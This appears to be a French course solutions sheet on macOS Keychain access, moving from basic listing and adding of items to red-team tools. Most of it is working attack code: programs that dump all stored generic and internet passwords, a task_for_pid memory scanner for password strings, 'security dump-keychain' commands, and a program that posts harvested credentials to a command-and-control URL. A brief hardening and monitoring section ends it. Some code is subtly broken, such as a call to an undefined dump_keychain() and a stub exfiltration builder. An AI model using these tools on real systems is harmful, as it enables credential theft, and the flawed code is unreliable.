# SOLUTION : Keychain Access macOS

## Exercice 1 : Lister items du keychain

```c
// list_keychain.c
#include <Security/Security.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>

void list_passwords() {
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    // Search for generic passwords
    CFDictionarySetValue(query, kSecClass, kSecClassGenericPassword);
    CFDictionarySetValue(query, kSecReturnAttributes, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecMatchLimit, kSecMatchLimitAll);

    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching(query, &result);

    if (status == errSecSuccess && result) {
        CFArrayRef items = (CFArrayRef)result;
        CFIndex count = CFArrayGetCount(items);

        printf("[+] Found %ld password entries:\n\n", count);

        for (CFIndex i = 0; i < count; i++) {
            CFDictionaryRef item = CFArrayGetValueAtIndex(items, i);

            CFStringRef account = CFDictionaryGetValue(item, kSecAttrAccount);
            CFStringRef service = CFDictionaryGetValue(item, kSecAttrService);

            char account_buf[256] = {0};
            char service_buf[256] = {0};

            if (account) {
                CFStringGetCString(account, account_buf, sizeof(account_buf),
                                 kCFStringEncodingUTF8);
            }

            if (service) {
                CFStringGetCString(service, service_buf, sizeof(service_buf),
                                 kCFStringEncodingUTF8);
            }

            printf("[%ld] Account: %s\n", i+1, account_buf);
            printf("    Service: %s\n\n", service_buf);
        }

        CFRelease(result);
    } else if (status == errSecItemNotFound) {
        printf("[-] No passwords found\n");
    } else {
        printf("[-] Error: %d\n", status);
    }

    CFRelease(query);
}

int main() {
    list_passwords();
    return 0;
}
```

**Compilation** :
```bash
clang list_keychain.c -o list_keychain -framework Security -framework CoreFoundation
./list_keychain
```

---

## Exercice 2 : Récupérer un mot de passe (avec prompt)

```c
// get_password.c
#include <Security/Security.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <string.h>

char *get_password(const char *service, const char *account) {
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    CFStringRef service_str = CFStringCreateWithCString(NULL, service,
                                                        kCFStringEncodingUTF8);
    CFStringRef account_str = CFStringCreateWithCString(NULL, account,
                                                        kCFStringEncodingUTF8);

    CFDictionarySetValue(query, kSecClass, kSecClassGenericPassword);
    CFDictionarySetValue(query, kSecAttrService, service_str);
    CFDictionarySetValue(query, kSecAttrAccount, account_str);
    CFDictionarySetValue(query, kSecReturnData, kCFBooleanTrue);

    CFDataRef password_data = NULL;
    OSStatus status = SecItemCopyMatching(query, (CFTypeRef *)&password_data);

    char *password = NULL;

    if (status == errSecSuccess && password_data) {
        CFIndex length = CFDataGetLength(password_data);
        password = malloc(length + 1);
        CFDataGetBytes(password_data, CFRangeMake(0, length), (UInt8 *)password);
        password[length] = '\0';

        CFRelease(password_data);
    } else if (status == errSecUserCanceled) {
        printf("[-] User canceled authorization\n");
    } else {
        printf("[-] Error retrieving password: %d\n", status);
    }

    CFRelease(query);
    CFRelease(service_str);
    CFRelease(account_str);

    return password;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <service> <account>\n", argv[0]);
        return 1;
    }

    char *password = get_password(argv[1], argv[2]);

    if (password) {
        printf("[+] Password: %s\n", password);
        free(password);
    } else {
        printf("[-] Failed to retrieve password\n");
    }

    return 0;
}
```

**Usage** :
```bash
./get_password "MyApp" "username"
# Prompt macOS apparaît pour autoriser l'accès
```

---

## Exercice 3 : Ajouter un mot de passe au keychain

```c
// add_password.c
#include <Security/Security.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <string.h>

int add_password(const char *service, const char *account, const char *password) {
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    CFStringRef service_str = CFStringCreateWithCString(NULL, service,
                                                        kCFStringEncodingUTF8);
    CFStringRef account_str = CFStringCreateWithCString(NULL, account,
                                                        kCFStringEncodingUTF8);
    CFDataRef password_data = CFDataCreate(NULL, (const UInt8 *)password,
                                          strlen(password));

    CFDictionarySetValue(query, kSecClass, kSecClassGenericPassword);
    CFDictionarySetValue(query, kSecAttrService, service_str);
    CFDictionarySetValue(query, kSecAttrAccount, account_str);
    CFDictionarySetValue(query, kSecValueData, password_data);

    OSStatus status = SecItemAdd(query, NULL);

    if (status == errSecSuccess) {
        printf("[+] Password added successfully\n");
    } else if (status == errSecDuplicateItem) {
        printf("[-] Password already exists\n");
    } else {
        printf("[-] Error adding password: %d\n", status);
    }

    CFRelease(query);
    CFRelease(service_str);
    CFRelease(account_str);
    CFRelease(password_data);

    return (status == errSecSuccess) ? 0 : 1;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <service> <account> <password>\n", argv[0]);
        return 1;
    }

    add_password(argv[1], argv[2], argv[3]);
    return 0;
}
```

---

## Exercice 4 : Dumper tous les passwords (RED TEAM)

```c
// dump_keychain.c
#include <Security/Security.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>

void dump_all_passwords() {
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    CFDictionarySetValue(query, kSecClass, kSecClassGenericPassword);
    CFDictionarySetValue(query, kSecReturnAttributes, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecReturnData, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecMatchLimit, kSecMatchLimitAll);

    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching(query, &result);

    if (status == errSecSuccess && result) {
        CFArrayRef items = (CFArrayRef)result;
        CFIndex count = CFArrayGetCount(items);

        printf("[*] Dumping %ld passwords from keychain...\n\n", count);

        for (CFIndex i = 0; i < count; i++) {
            CFDictionaryRef item = CFArrayGetValueAtIndex(items, i);

            CFStringRef account = CFDictionaryGetValue(item, kSecAttrAccount);
            CFStringRef service = CFDictionaryGetValue(item, kSecAttrService);
            CFDataRef password_data = CFDictionaryGetValue(item, kSecValueData);

            char account_buf[256] = {0};
            char service_buf[256] = {0};

            if (account) {
                CFStringGetCString(account, account_buf, sizeof(account_buf),
                                 kCFStringEncodingUTF8);
            }

            if (service) {
                CFStringGetCString(service, service_buf, sizeof(service_buf),
                                 kCFStringEncodingUTF8);
            }

            printf("========================================\n");
            printf("Service: %s\n", service_buf);
            printf("Account: %s\n", account_buf);

            if (password_data) {
                CFIndex len = CFDataGetLength(password_data);
                char *password = malloc(len + 1);
                CFDataGetBytes(password_data, CFRangeMake(0, len), (UInt8 *)password);
                password[len] = '\0';

                printf("Password: %s\n", password);
                free(password);
            } else {
                printf("Password: [Access Denied]\n");
            }

            printf("\n");
        }

        CFRelease(result);
    } else {
        printf("[-] Error dumping keychain: %d\n", status);
    }

    CFRelease(query);
}

int main() {
    printf("[!] WARNING: This will attempt to dump all passwords\n");
    printf("[!] macOS will prompt for authorization\n\n");

    dump_keychain();
    return 0;
}
```

**Note** : macOS demandera l'autorisation pour CHAQUE mot de passe.

---

## Exercice 5 : Keychain dump sans prompts (technique avancée)

**Méthode 1 : Via security command-line tool**

```bash
# Lister tous les items
security dump-keychain

# Trouver password d'un service
security find-generic-password -s "ServiceName" -w

# Dump en clair (nécessite authentification)
security dump-keychain -d login.keychain
```

**Méthode 2 : Accès direct au fichier keychain (chiffré)**

```bash
# Localisation
ls -la ~/Library/Keychains/

# Keychain principal
~/Library/Keychains/login.keychain-db

# Note: Fichier chiffré, nécessite master password
```

**Méthode 3 : Memory dumping (si app a déjà unlock)**

```c
// memory_search.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>

void search_memory_for_passwords(pid_t pid) {
    mach_port_t task;
    kern_return_t kr;

    kr = task_for_pid(mach_task_self(), pid, &task);
    if (kr != KERN_SUCCESS) {
        printf("[-] task_for_pid failed\n");
        return;
    }

    mach_vm_address_t address = 0;
    mach_vm_size_t size;
    vm_region_basic_info_data_64_t info;
    mach_msg_type_number_t info_count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t object_name;

    while (1) {
        kr = mach_vm_region(task, &address, &size, VM_REGION_BASIC_INFO_64,
                           (vm_region_info_t)&info, &info_count, &object_name);

        if (kr != KERN_SUCCESS) break;

        // Read memory region
        char *buffer = malloc(size);
        mach_vm_size_t read_size = size;

        kr = mach_vm_read_overwrite(task, address, size,
                                    (mach_vm_address_t)buffer, &read_size);

        if (kr == KERN_SUCCESS) {
            // Search for password patterns
            // (simplified - real implementation would use heuristics)
            char *patterns[] = {"password=", "pwd=", "pass:", NULL};

            for (int i = 0; patterns[i] != NULL; i++) {
                char *found = memmem(buffer, size, patterns[i], strlen(patterns[i]));
                if (found) {
                    printf("[!] Potential password found at 0x%llx\n", address + (found - buffer));
                }
            }
        }

        free(buffer);
        address += size;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <pid>\n", argv[0]);
        return 1;
    }

    search_memory_for_passwords(atoi(argv[1]));
    return 0;
}
```

---

## Exercice 6 : Accéder aux Internet Passwords (Safari, etc.)

```c
// dump_internet_passwords.c
#include <Security/Security.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>

void dump_internet_passwords() {
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    CFDictionarySetValue(query, kSecClass, kSecClassInternetPassword);
    CFDictionarySetValue(query, kSecReturnAttributes, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecReturnData, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecMatchLimit, kSecMatchLimitAll);

    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching(query, &result);

    if (status == errSecSuccess && result) {
        CFArrayRef items = (CFArrayRef)result;
        CFIndex count = CFArrayGetCount(items);

        printf("[*] Found %ld internet passwords:\n\n", count);

        for (CFIndex i = 0; i < count; i++) {
            CFDictionaryRef item = CFArrayGetValueAtIndex(items, i);

            CFStringRef server = CFDictionaryGetValue(item, kSecAttrServer);
            CFStringRef account = CFDictionaryGetValue(item, kSecAttrAccount);
            CFStringRef protocol = CFDictionaryGetValue(item, kSecAttrProtocol);
            CFDataRef password_data = CFDictionaryGetValue(item, kSecValueData);

            char server_buf[256] = {0};
            char account_buf[256] = {0};

            if (server) {
                CFStringGetCString(server, server_buf, sizeof(server_buf),
                                 kCFStringEncodingUTF8);
            }

            if (account) {
                CFStringGetCString(account, account_buf, sizeof(account_buf),
                                 kCFStringEncodingUTF8);
            }

            printf("[%ld] Server: %s\n", i+1, server_buf);
            printf("    Account: %s\n", account_buf);

            if (password_data) {
                CFIndex len = CFDataGetLength(password_data);
                char *password = malloc(len + 1);
                CFDataGetBytes(password_data, CFRangeMake(0, len), (UInt8 *)password);
                password[len] = '\0';
                printf("    Password: %s\n", password);
                free(password);
            }

            printf("\n");
        }

        CFRelease(result);
    }

    CFRelease(query);
}

int main() {
    dump_internet_passwords();
    return 0;
}
```

---

## Exercice 7 : Exfiltrer keychain (RED TEAM)

```c
// exfil_keychain.c
#include <Security/Security.h>
#include <CoreFoundation/CoreFoundation.h>
#include <stdio.h>
#include <curl/curl.h>

void exfiltrate_to_c2(const char *data) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    curl_easy_setopt(curl, CURLOPT_URL, "http://c2-server.com/exfil");
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, data);

    curl_easy_perform(curl);
    curl_easy_cleanup(curl);

    printf("[+] Data exfiltrated\n");
}

void harvest_and_exfil() {
    // Collecter passwords
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    CFDictionarySetValue(query, kSecClass, kSecClassGenericPassword);
    CFDictionarySetValue(query, kSecReturnAttributes, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecReturnData, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecMatchLimit, kSecMatchLimitAll);

    CFTypeRef result = NULL;
    OSStatus status = SecItemCopyMatching(query, &result);

    if (status == errSecSuccess && result) {
        // Créer JSON pour exfil
        char json[65536] = "{\"passwords\":[";

        CFArrayRef items = (CFArrayRef)result;
        CFIndex count = CFArrayGetCount(items);

        for (CFIndex i = 0; i < count; i++) {
            CFDictionaryRef item = CFArrayGetValueAtIndex(items, i);

            // Extract data et construire JSON
            // (simplified)

            strcat(json, "{},");
        }

        strcat(json, "]}");

        // Exfiltrer
        exfiltrate_to_c2(json);

        CFRelease(result);
    }

    CFRelease(query);
}

int main() {
    harvest_and_exfil();
    return 0;
}
```

---

## Exercice 8 : Protection contre keychain theft

```bash
# 1. Hardened Runtime
codesign -s - --options=runtime myapp

# 2. Keychain Access Control
# Créer password avec ACL stricte
security add-generic-password -a "user" -s "service" -w "password" \
    -T "/path/to/myapp"

# 3. Monitoring (Blue Team)
# Surveiller accès keychain
log stream --predicate 'process == "securityd"' --level debug
```

---

## Resources

- [Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
- [Dumping macOS Keychain](https://posts.specterops.io/when-macs-come-under-attak-macos-red-team-1-3-9de5a76e63a1)
- [chainbreaker](https://github.com/n0fate/chainbreaker) - Keychain forensics tool
